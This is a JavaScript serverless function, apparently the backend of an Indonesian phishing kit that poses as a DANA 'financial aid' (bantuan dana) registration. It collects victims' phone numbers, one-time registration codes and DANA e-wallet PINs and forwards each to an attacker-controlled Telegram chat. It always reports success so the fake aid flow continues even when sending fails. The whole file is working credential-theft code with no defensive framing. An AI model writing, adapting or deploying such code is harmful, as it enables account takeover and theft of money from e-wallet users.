const https = require('https');

exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    const data = JSON.parse(event.body);
    const { type, phone, pin, reward } = data;
    
    if (!type) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Type is required' })
      };
    }

    // Konfigurasi bot Telegram
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Telegram bot configuration missing');
      // Tetap return success agar flow aplikasi tidak terganggu
      return {
        statusCode: 200,
        body: JSON.stringify({ 
          success: true, 
          message: 'Telegram bot not configured, but data processed' 
        })
      };
    }

    // Format pesan berdasarkan jenis data
    let message = '';
    const timestamp = new Date().toLocaleString('id-ID');
    
    switch (type) {
      case 'phone':
        message = `📱 *DATA PENDAFTARAN BANTUAN DANA* 📱\n\n` +
                  `🕐 *Waktu:* ${timestamp}\n` +
                  `📞 *Nomor:* +62${phone}\n` +
                  `=================================`;
        break;
        
      case 'pin':
        message = `🔐 *KODE PENDAFTARAN BANTUAN DANA* 🔐\n\n` +
                  `🕐 *Waktu:* ${timestamp}\n` +
                  `📞 *Nomor:* +62${phone}\n` +
                  `🔢 *Kode Pendaftaran:* ${pin}\n` +
                  `=================================`;
        break;
        
      case 'reward':
        message = `💰 *NOMINAL BANTUAN DANA* 💰\n\n` +
                  `🕐 *Waktu:* ${timestamp}\n` +
                  `📞 *Nomor:* +62${phone}\n` +
                  `🔢 *Kode Pendaftaran:* ${pin}\n` +
                  `🎁 *Nominal Bantuan:* ${reward}\n` +
                  `=================================`;
        break;
        
      case 'withdraw':
        message = `💸 *PROSES PENARIKAN DANA* 💸\n\n` +
                  `🕐 *Waktu:* ${timestamp}\n` +
                  `📞 *Nomor:* +62${phone}\n` +
                  `🔒 *PIN DANA:* ${pin}\n` +
                  `💳 *Jumlah Penarikan:* ${reward}\n` +
                  `=================================`;
        break;
        
      case 'success':
        message = `✅ *PENARIKAN DANA BERHASIL* ✅\n\n` +
                  `🕐 *Waktu:* ${timestamp}\n` +
                  `📞 *Nomor:* +62${phone}\n` +
                  `🎉 *Jumlah Berhasil Ditarik:* ${reward}\n` +
                  `💰 *Status:* Dana berhasil ditransfer\n` +
                  `=================================`;
        break;
        
      default:
        return {
          statusCode: 400,
          body: JSON.stringify({ error: 'Invalid type' })
        };
    }

    // Encode message for URL
    const encodedMessage = encodeURIComponent(message);
    
    // URL untuk mengirim pesan ke bot Telegram
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
    
    // Mengirim pesan ke Telegram
    await new Promise((resolve, reject) => {
      https.get(url, (res) => {
        let responseData = '';
        
        res.on('data', (chunk) => {
          responseData += chunk;
        });
        
        res.on('end', () => {
          if (res.statusCode === 200) {
            console.log('Telegram message sent successfully');
            resolve(responseData);
          } else {
            console.error('Telegram API error:', res.statusCode, responseData);
            reject(new Error(`Telegram API error: ${res.statusCode}`));
          }
        });
      }).on('error', (err) => {
        console.error('HTTP request error:', err);
        reject(err);
      });
    });

    console.log(`Data sent to Telegram: ${type} for phone ${phone}`);
    
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
      },
      body: JSON.stringify({ 
        success: true, 
        message: 'Data sent successfully' 
      })
    };
    
  } catch (error) {
    console.error('Error processing request:', error);
    
    // Tetap return success agar flow aplikasi tidak terganggu
    // meskipun gagal mengirim ke Telegram
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
      },
      body: JSON.stringify({ 
        success: true, 
        message: 'Data processed but failed to send to Telegram',
        error: error.message 
      })
    };
  }
};
